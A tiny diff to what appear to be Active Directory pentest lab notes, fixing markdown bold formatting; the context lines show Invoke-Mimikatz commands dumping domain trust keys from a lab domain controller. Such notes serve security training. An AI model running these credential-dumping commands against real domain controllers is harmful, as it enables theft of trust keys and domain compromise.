@@ -27,7 +27,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 
 ```
 
-W**ith Mimikatz only:**
+**With Mimikatz only:**
 
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
